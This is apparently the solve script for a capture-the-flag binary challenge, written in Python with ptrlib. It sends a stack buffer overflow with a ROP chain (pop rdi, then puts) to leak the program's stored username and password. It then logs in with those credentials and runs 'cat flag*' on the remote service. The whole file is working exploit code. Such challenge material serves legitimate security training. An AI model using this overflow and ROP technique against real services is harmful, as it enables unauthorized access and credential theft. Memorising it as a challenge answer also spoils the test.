from ptrlib import *
import os

rop_pop_rdi = 0x00400b03

HOST = os.getenv('HOST', '0.0.0.0')
PORT = os.getenv('PORT', '9002')

elf = ELF("../distfiles/chall")

for i in range(3):
    # leak username
    #sock = Process("../distfiles/chall", cwd="../distfiles")
    sock = Socket(HOST, int(PORT))
    payload  = b'A' * 0x28
    payload += p64(rop_pop_rdi)
    payload += p64(elf.symbol('username'))
    payload += p64(elf.plt('puts'))
    sock.sendafter(": ", payload[:-2])
    sock.shutdown('write')
    username = sock.recvlineafter(": ")
    sock.close()

    # leak password
    #sock = Process("../distfiles/chall", cwd="../distfiles")
    sock = Socket(HOST, int(PORT))
    payload  = b'A' * 0x28
    payload += p64(rop_pop_rdi)
    payload += p64(elf.symbol('password'))
    payload += p64(elf.plt('puts'))
    sock.sendafter(": ", payload[:-2])
    sock.shutdown('write')
    password = sock.recvlineafter(": ")
    sock.close()

    # auth
    #sock = Process("../distfiles/chall", cwd="../distfiles")
    sock = Socket(HOST, int(PORT))
    sock.sendlineafter(": ", username)
    sock.sendlineafter(": ", password)

    sock.recvuntil("[+] OK!\n")
    sock.sendline("cat flag*")
    print(sock.recvline())

    sock.close()
